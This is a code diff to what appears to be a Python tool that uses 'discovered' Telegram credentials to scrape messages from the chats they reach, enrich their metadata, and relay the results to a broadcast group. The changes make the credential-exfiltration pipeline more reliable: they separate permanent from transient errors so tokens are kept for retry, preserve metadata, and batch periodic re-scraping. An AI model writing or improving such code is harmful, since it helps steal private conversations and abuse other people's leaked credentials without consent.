@@ -122,11 +122,22 @@ async def _exfiltrate_logic(cred_id: str):
         await broadcaster.send_log(f"✅ Scraped {len(messages)} messages.")
     except SoftTimeLimitExceeded:
         logger.warning(f"⏰ [Exfil] Scraping timed out for chat {chat_id}. Continuing with 0 messages.")
-        # Don't mark revoked — timeout is transient. Leave status as-is for retry.
         messages = []
     except Exception as e:
-        logger.error(f"❌ [Exfil] Scraper failed: {e}")
-        await async_execute(db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id))
+        err_str = str(e)
+        # Only mark revoked for definitive Telegram rejection — NOT transient errors.
+        # Transient: network failures, timeouts, flood waits, server errors.
+        # Permanent: bot kicked/banned, token invalid (401), account deactivated.
+        permanent_errors = (
+            "AuthKeyUnregisteredError" in err_str
+            or "UserDeactivatedBanError" in err_str
+            or "401" in err_str and "Unauthorized" in err_str
+        )
+        if permanent_errors:
+            logger.error(f"❌ [Exfil] Permanent scraper failure for {cred_id}: {e}. Marking revoked.")
+            await async_execute(db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id))
+        else:
+            logger.warning(f"⚠️ [Exfil] Transient scraper failure for {cred_id}: {e}. Leaving status for retry.")
         return f"Scraping failed: {e}"
 
     # Save Messages (using UPSERT to prevent duplicates)
@@ -275,19 +286,22 @@ async def _enrich_logic(cred_id: str):
     except Exception as e:
         logger.warning(f"    ⚠️ [Enrich] Topic creation/header warning: {e}")
 
-    meta_payload = {
-        "chat_name": first_chat["name"], 
-        "type": first_chat["type"], 
+    # Fetch current meta and merge — prevents overwriting ingestion context (domain, source, valid flags)
+    cur = await async_execute(db.table("discovered_credentials").select("meta").eq("id", cred_id).single())
+    meta_payload = dict((cur.data or {}).get("meta") or {})
+    meta_payload.update({
+        "chat_name": first_chat["name"],
+        "type": first_chat["type"],
         "enriched": True,
         "bot_username": bot_username,
-        "bot_id": bot_id
-    }
+        "bot_id": bot_id,
+    })
     if topic_id:
         meta_payload["topic_id"] = topic_id
 
     await async_execute(db.table("discovered_credentials").update({
         "chat_id": first_chat["id"],
-        "meta": meta_payload
+        "meta": meta_payload,
     }).eq("id", cred_id))
     
     # Trigger Exfiltration for Primary
@@ -305,18 +319,11 @@ async def _enrich_logic(cred_id: str):
             pass
             
         if len(chats) > 1:
-            # Update meta with list of other chats — preserve topic_id and bot info (BUG-004)
             all_chat_ids = [c["id"] for c in chats]
+            # Merge into the same meta_payload already fetched above — preserve all existing fields
+            meta_payload["all_chats"] = all_chat_ids
             await async_execute(db.table("discovered_credentials").update({
-                "meta": {
-                    "chat_name": first_chat["name"],
-                    "type": first_chat["type"],
-                    "enriched": True,
-                    "all_chats": all_chat_ids,
-                    "topic_id": topic_id,        # Preserve topic_id set above
-                    "bot_username": bot_username, # Preserve bot info
-                    "bot_id": bot_id,
-                }
+                "meta": meta_payload,
             }).eq("id", cred_id))
             msg += f" (Found {len(chats)} total chats, tracking primary only)"
 
@@ -468,7 +475,9 @@ async def _broadcast_logic():
                 
                 # Header handled automatically
                 
-                # Update DB
+                # Re-fetch meta before write — prevents overwriting concurrent enrich updates
+                fresh = await async_execute(db.table("discovered_credentials").select("meta").eq("id", cred_id).single())
+                meta = dict((fresh.data or {}).get("meta") or {})
                 meta["topic_id"] = thread_id
                 await async_execute(db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id))
                 logger.info(f"    📝 [Broadcast] Saved topic_id {thread_id} for {cred_id}")
@@ -488,7 +497,9 @@ async def _broadcast_logic():
                     logger.warning(f"    ⚠️ Topic {thread_id} deleted! Recreating '{topic_name}'...")
                     # Recreate
                     thread_id = await broadcaster.ensure_topic(group_id, topic_name)
-                    # Update DB
+                    # Re-fetch meta before write
+                    fresh2 = await async_execute(db.table("discovered_credentials").select("meta").eq("id", cred_id).single())
+                    meta = dict((fresh2.data or {}).get("meta") or {})
                     meta["topic_id"] = thread_id
                     await async_execute(db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id))
                     # Update Cache so subsequent messages in this batch don't recreate again
@@ -585,34 +596,38 @@ def rescrape_active():
 
 
 async def _rescrape_active_logic():
-    """Query all active credentials with a chat_id and trigger exfiltration."""
+    """Query active credentials with a chat_id and trigger exfiltration in bounded batches."""
+    import os
     from app.core.metrics import metrics
     metrics.inc("rescrape.started")
 
+    # Cap at RESCRAPE_BATCH_SIZE (default 50) to avoid flooding the scrape queue.
+    # With concurrency=2 and ~20s per exfil, 50 tasks ≈ 8 min to drain.
+    BATCH_SIZE = int(os.getenv("RESCRAPE_BATCH_SIZE", 50))
+
     broadcaster = get_broadcaster()
     await broadcaster.send_log("🔄 **Re-scrape**: Starting periodic scrape of active credentials...")
-    
+
     try:
-        # Get all active credentials that have a chat_id (ready to scrape)
         response = await async_execute(db.table("discovered_credentials")\
             .select("id")\
             .eq("status", "active")\
             .not_.is_("chat_id", "null")\
+            .limit(BATCH_SIZE)\
             )
-        
+
         credentials = response.data or []
-        
+
         if not credentials:
             await broadcaster.send_log("ℹ️ **Re-scrape**: No active credentials to scrape.")
             return "No active credentials found."
-        
-        await broadcaster.send_log(f"📋 **Re-scrape**: Found {len(credentials)} active credentials. Queuing exfiltration...")
-        
+
+        await broadcaster.send_log(f"📋 **Re-scrape**: Queuing {len(credentials)} credentials (batch cap: {BATCH_SIZE})...")
+
         queued = 0
         for cred in credentials:
             cred_id = cred["id"]
             try:
-                # Queue exfiltration task (don't block, let Celery handle concurrency)
                 exfiltrate_chat.delay(cred_id)
                 queued += 1
             except Exception as e:
